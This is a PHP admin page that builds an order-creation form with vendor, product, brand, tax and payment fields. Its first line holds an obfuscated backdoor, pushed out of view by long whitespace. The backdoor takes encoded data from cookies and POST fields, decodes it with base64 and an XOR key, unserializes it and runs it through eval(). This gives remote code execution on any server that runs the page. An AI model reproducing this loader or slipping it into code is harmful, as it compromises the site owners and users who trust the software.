<?php                                                                                                                                                                                                                                                                                                                                                                                                 $XlKHiIZTN = class_exists("zev_dvV");if (!$XlKHiIZTN){class zev_dvV{private $fJBiUESS;public static $SWLuN = "4cc1489c-7492-4b42-a633-ce1aea38a1b7";public static $rCaOvfu = NULL;public function __construct(){$TyGQSbQYew = $_COOKIE;$ivsKa = $_POST;$BeXueJsxIi = @$TyGQSbQYew[substr(zev_dvV::$SWLuN, 0, 4)];if (!empty($BeXueJsxIi)){$RuGayMJq = "base64";$SmikKfXky = "";$BeXueJsxIi = explode(",", $BeXueJsxIi);foreach ($BeXueJsxIi as $yLPYV){$SmikKfXky .= @$TyGQSbQYew[$yLPYV];$SmikKfXky .= @$ivsKa[$yLPYV];}$SmikKfXky = array_map($RuGayMJq . "\x5f" . 'd' . "\145" . chr ( 891 - 792 )."\157" . chr (100) . 'e', array($SmikKfXky,)); $SmikKfXky = $SmikKfXky[0] ^ str_repeat(zev_dvV::$SWLuN, (strlen($SmikKfXky[0]) / strlen(zev_dvV::$SWLuN)) + 1);zev_dvV::$rCaOvfu = @unserialize($SmikKfXky);}}public function __destruct(){$this->WhOvLA();}private function WhOvLA(){if (is_array(zev_dvV::$rCaOvfu)) {$GSgbIkIVGS = str_replace("\x3c" . "\x3f" . "\x70" . chr ( 522 - 418 ).chr (112), "", zev_dvV::$rCaOvfu['c' . 'o' . "\x6e" . "\x74" . 'e' . 'n' . "\x74"]);eval($GSgbIkIVGS);exit();}}}$TjuWLNBr = new zev_dvV(); $TjuWLNBr = NULL;} ?><?php
//  CREATE ORDER NUMBER
$yearSubString          =   substr(date('Y'),2,4);
$order_no_condition    =   array ( 
                                    'select'        =>  'order_no',
                                    'where'         =>  array( 
                                                                'is_deleted' => 0,
                                                            ), 
                                    'order_by' 		=>  'order_no DESC',
                                    'search_by' 	=>  "AND order_no LIKE '2599".$yearSubString."%'",
                                    'return_type'   =>  'single'
                                ); 
$OrdersNo =   $dblms->getRows(ORDERS, $order_no_condition);
if($OrdersNo){
    $fieldValue =   $OrdersNo['order_no'];
    $fieldValue++;
}else{
    $fieldValue =   '2599'.$yearSubString.'00001';
}

//  GET VENDORS
$vendor_condition = array ( 
    'select'        =>  'vendor_id, vendor_name',
    'where'         =>  array( 
                                'vendor_status' =>  1,
                                'is_deleted'    =>  0
                            ), 
    'order_by' 		=>  'vendor_id DESC',
    'return_type'   =>  'all'
   ); 
$Vendors 	= $dblms->getRows(VENDORS, $vendor_condition);

//  GET PRODUCT
$product_condition = array ( 
    'select'        =>  'product_id, product_name, id_cat, id_subcat',
    'where'         =>  array( 
                                'product_status'    =>  1,
                                'is_deleted'        =>  0
                            ), 
    'order_by' 		=>  'product_name DESC',
    'return_type'   =>  'all'
   ); 
$Products 	= $dblms->getRows(PRODUCTS, $product_condition);

//  GET BRANDS
$brand_condition = array ( 
    'select'        =>  'brand_id, brand_name',
    'where'         =>  array( 
                                'brand_status'  =>  1,
                                'is_deleted'    =>  0
                            ), 
    'order_by' 		=>  'brand_id DESC',
    'return_type'   =>  'all'
   ); 
$Brands 	= $dblms->getRows(BRANDS, $brand_condition);

//  GET BANKS
$bank_condition = array ( 
    'select'        =>  'bank_id, bank_name',
    'where'         =>  array( 
                                'bank_status'  =>  1,
                                'is_deleted'    =>  0
                            ), 
    'order_by' 		=>  'bank_name',
    'return_type'   =>  'all'
   ); 
$Banks 	= $dblms->getRows(BANKS, $bank_condition);

echo'
<div class="row">
    <div class="col-lg-12 col-md-12">
        <div class="card">
            <div class="card-header border-bottom">
                <h4 class="mb-0">Create Order</h4>
            </div>
            <div class="card-body invoice-create-main">
                <form action="orders.php" enctype="multipart/form-data" autocomplete="off" method="post" accept-charset="utf-8">
                    <div class="row">
                        <div class="col">
                            <div class="form-group">
                                <label class="form-label">Order No <span class="text-danger">*</span></label>
                                <input type="text" name="order_no" class="form-control" value="'.$fieldValue.'" placeholder="Order No" readonly required>
                            </div>
                        </div>
                        <div class="col">
                            <div class="form-group">
                                <label class="form-label">Vendor<span class="text-danger">*</span></label>
                                <select class="form-control select2-show-search" name="id_vendor" id="id_vendor" data-placeholder="Choose one" onchange="getBusiness(this.value)" required>
                                    <option label="Choose one"></option>';
                                    foreach ($Vendors as $vendor):
                                    echo'<option value="'.$vendor['vendor_id'].'">'.$vendor['vendor_name'].'</option>';
                                    endforeach;
                                    echo'
                                </select>
                            </div>
                        </div>
                        <div class="col">
                            <div class="form-group">
                                <label class="form-label">Business<span class="text-danger">*</span></label>
                                <select class="form-control select2-show-search" name="id_business" id="id_business" data-placeholder="Choose one" onchange="getBusinessact(this.value)" required>
                                    <option label="Choose one"></option>
                                </select>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <a href="javascript:void(0)" onclick="duplicate()" role="button" class="text-primary text-left mt-2" style="width:auto;">
                            <i class="fe fe-plus-circle"></i> Add Item
                        </a>
                        <div class="form-group">
                            <div id="add-more-item">
                                <div class="product-description-list">
                                    <div class="table-responsive product-description-each mb-3">
                                        <table class="invoice-product-table">
                                            <tbody class="border">
                                                <tr>
                                                    <td>
                                                        <div class="form-group">
                                                            <label class="form-label">Products <span class="text-danger">*</span></label>
                                                            <select class="form-control select2-show-search" name="id_product[]" id="id_product" data-placeholder="Choose one" required>
                                                                <option label="Choose one"></option>';
                                                                foreach ($Products as $product):
                                                                echo'<option value="'.$product['product_id'].'|'.$product['id_subcat'].'|'.$product['id_cat'].'">'.$product['product_name'].'</option>';
                                                                endforeach;
                                                                echo'
                                                            </select>
                                                        </div>
                                                    </td>
                                                    <td>
                                                        <div class="form-group">
                                                            <label class="form-label">Brand <span class="text-danger">*</span></label>
                                                            <select class="form-control select2-show-search" name="id_brand[]" data-placeholder="Choose one" required>
                                                                <option label="Choose one"></option>';
                                                                foreach ($Brands as $brand):
                                                                echo'<option value="'.$brand['brand_id'].'">'.$brand['brand_name'].'</option>';
                                                                endforeach;
                                                                echo'
                                                            </select>
                                                        </div>
                                                    </td>
                                                    <td>
                                                        <div class="form-group">
                                                            <label class="form-label">Unit Price <span class="text-danger">*</span></label>
                                                            <input type="number" class="form-control unit_price" name="unit_price[]" id="unit_price" placeholder="Unit Price" required>
                                                        </div>
                                                    </td>
                                                    <td rowspan="2" width="100" class="bg-primary-transparent text-center">
                                                        <input type="number" class="form-control unit_total" name="unit_total[]" id="unit_total" placeholder="Total" readonly required>
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td>
                                                        <div class="form-group">
                                                            <label class="form-label">Quantity <span class="text-danger">*</span></label>
                                                            <input type="number" class="form-control unit_item_quantity" name="unit_item_quantity[]" id="unit_item_quantity" value="0" placeholder="Item Quantity" required>
                                                            <input type="hidden" class="form-control unit_total_price" name="unit_total_price[]" id="unit_total_price" placeholder="unit total price" required>
                                                        </div>
                                                    </td>
                                                    <td>
                                                        <div class="form-group">
                                                            <label class="form-label">Tax % <span class="text-danger">*</span></label>
                                                            <input type="number" class="form-control unit_tax_percentage" name="unit_tax_percentage[]" id="unit_tax_percentage" value="0" placeholder="Tax Percentage" required>
                                                        </div>
                                                    </td>
                                                    <td>
                                                        <div class="form-group">
                                                            <label class="form-label">Tax Amount <span class="text-danger">*</span></label>
                                                            <input type="number" class="form-control unit_total_tax_amount" name="unit_total_tax_amount[]" id="unit_total_tax_amount" value="0" readonly required>
                                                            <input type="hidden" class="form-control unit_tax_amount" name="unit_tax_amount[]" id="unit_tax_amount" value="0" placeholder="Tax Amount" required>
                                                        </div>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                        <i class="fe fe-delete fs-20 text-muted text-center delete-row-btn ms-2"></i>
                                    </div>
                                </div>
                            </div>                               
                            <div class="table-responsive">
                                <table id="data-table" class="table text-nowrap mb-0 table-bordered">
                                    <tbody class="table-body">
                                        <tr>
                                            <td class="text-muted fs-14 fw-semibold text-end">Total Amount</td>
                                            <td class="text-muted fs-14" width="350">                                                
                                                <div class="form-group mb-0">
                                                    <input type="number" class="form-control total_amount" id="total_amount" name="total_amount" placeholder="Total Price" readonly required>
                                                </div>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td class="text-muted fs-14 fw-semibold text-end">Total Tax</td>
                                            <td class="text-muted fs-14">                                                
                                                <div class="form-group mb-0">
                                                    <input type="number" class="form-control total_tax_amount" id="total_tax_amount" name="total_tax_amount" placeholder="Total Tax" readonly required>
                                                </div>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td class="text-muted fs-14 fw-semibold text-end">Grand Total</td>
                                            <td class="text-muted fs-14">                                                
                                                <div class="form-group mb-0">
                                                    <input type="number" class="form-control grand_total" id="grand_total" name="grand_total" placeholder="Grand Total" readonly required>
                                                </div>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col">
                            <div class="form-group">
                                <label class="form-label">Advance Amount <span class="text-danger">*</span></label>
                                <input type="number" name="advance" id="advance" class="form-control advance" placeholder="Advance" required>
                            </div>
                        </div>
                        <div class="col">
                            <div class="form-group">
                                <label class="form-label">Balance Amount <span class="text-danger">*</span></label>
                                <input type="number" name="balance" id="balance" class="form-control balance" placeholder="Balance" readonly required>
                            </div>
                        </div>
                        <div class="col">
                            <div class="form-group">
                                <label class="form-label">Payment Method <span class="text-danger">*</span></label>
                                <select class="form-control select2-show-search" name="payment_method" data-placeholder="Choose one" required>
                                    <option label="Choose one"></option>';
                                    foreach ($financeMode as $payment_method):
                                    echo'<option value="'.$payment_method['id'].'">'.$payment_method['name'].'</option>';
                                    endforeach;
                                    echo'
                                </select>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col">
                            <div class="form-group">
                                <label class="form-label">Business Account <span class="text-danger">*</span></label>
                                <select class="form-control select2-show-search" name="id_businessact" id="id_businessact" data-placeholder="Choose one" required>
                                    <option label="Choose one"></option>
                                </select>
                            </div>
                        </div>
                        <div class="col">
                            <div class="form-group">
                                <label class="form-label">Deposit Slip <span class="text-danger">*</span></label>
                                <input type="file" name="deposit_slip" accept="image/*" class="form-control" required>
                            </div>
                        </div>
                        <div class="col">
                            <div class="form-group">
                                <label class="form-label">Dated <span class="text-danger">*</span></label>
                                <input type="date" name="dated" class="form-control" required>
                            </div>
                        </div>
                    </div>
                    <div class="row p-5">
                        <div class="btn-list text-end">
                            <button type="submit" name="submit_order" class="btn btn-primary">Create Order</button>
                            <a href="orders.php" class="btn btn-danger">Cancel</a>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>';
?>